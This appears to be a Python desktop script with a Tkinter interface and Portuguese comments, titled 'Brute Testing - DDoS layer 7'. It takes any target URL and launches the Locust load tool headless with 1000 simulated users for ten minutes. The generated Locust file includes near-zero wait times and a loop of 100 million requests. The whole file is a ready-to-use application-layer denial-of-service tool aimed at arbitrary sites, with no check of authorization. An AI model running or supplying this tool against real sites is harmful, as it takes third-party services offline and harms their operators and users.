#!/usr/bin/env python3

import tkinter as tk
from tkinter import messagebox
import subprocess
import threading
from locust import HttpUser, task, between
import os
import sys

# Classe da interface gráfica
class AttackApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Brute Testing - DDoS layer 7")
        
        # Estilo da janela
        self.root.config(bg="#27282A")
        
        # Label
        self.label = tk.Label(root, text="Insira a URL do alvo:", fg="#F17E18", bg="#27282A")
        self.label.pack(pady=10)
        
        # Campo de entrada
        self.url_entry = tk.Entry(root, width=50)
        self.url_entry.pack(pady=5)
        
        # Botão para iniciar o ataque
        self.start_button = tk.Button(root, text="Iniciar!", command=self.start_attack, bg="#F17E18", fg="white")
        self.start_button.pack(pady=20)

    def start_attack(self):
        url = self.url_entry.get()
        if not url:
            messagebox.showwarning("Atenção", "Por favor, insira uma URL.")
            return
        
        # Mostra pop-up informando que o ataque foi iniciado
        messagebox.showinfo("Pronto!", """Clique em "OK" para iniciar!""")

        # Inicia o ataque em uma thread separada
        threading.Thread(target=self.run_locust, args=(url,)).start()

    def run_locust(self, url):
        # Criar um arquivo temporário para o locustfile
        locustfile_path = "/tmp/locustfile.py"
        with open(locustfile_path, "w") as f:
            f.write(self.get_locust_code(url))

        # Comando do Locust
        command = [
            "locust", 
            "-f", locustfile_path,   # Caminho para o arquivo temporário do Locust
            "--headless", 
            "-u", "1000",            # Número de usuários
            "-r", "100",             # Taxa de usuários por segundo
            "--run-time", "10m",     # Duração do ataque
            "--host", url            # URL de destino passada pelo usuário
        ]
        
        # Executa o comando
        try:
            # Executa o comando e não espera sua conclusão
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = process.communicate()

            # Verifica a saída
            if process.returncode == 0:
                messagebox.showinfo("Concluído", "Ataque iniciado com sucesso!")
            else:
                messagebox.showerror("Erro", f"Ocorreu um erro ao iniciar o ataque:\n{error.decode()}")
        except Exception as e:
            messagebox.showerror("Erro", f"Ocorreu um erro:\n{str(e)}")

    def get_locust_code(self, url):
        return f"""
from locust import HttpUser, task, between

class WebsiteUser(HttpUser):
    wait_time = between(1, 2)

    @task
    def load_test(self):
        self.client.get("/")

    @task
    def submit_form(self):
        self.client.post("/", data={{"field1": "value1", "field2": "value2"}})

    @task
    def other_endpoint(self):
        self.client.get("/#")

class HeavyLoadUser(HttpUser):
    wait_time = between(0.001, 0.1)  # Defina o intervalo de tempo de espera entre requisições

    @task
    def high_frequency_requests(self):
        self.client.get("/")  # Requisição GET na raiz
        self.client.post("/", json={{"data": "high_load"}})  # Requisição POST com alta carga
        self.client.get("/other-endpoint")  # Requisição GET em outro endpoint
    
    def on_start(self):
        print("Iniciando múltiplos tipos de requisições")

    @task
    def load_test_heavy(self):
        for i in range(100000000):  # Número razoável de requisições por loop
            response = self.client.get("/")
            if response.status_code != 200:
                print(f"Erro na requisição {{i}}: {{response.status_code}}")
        """

if __name__ == "__main__":
    root = tk.Tk()
    app = AttackApp(root)
    root.geometry("600x300")
    root.mainloop()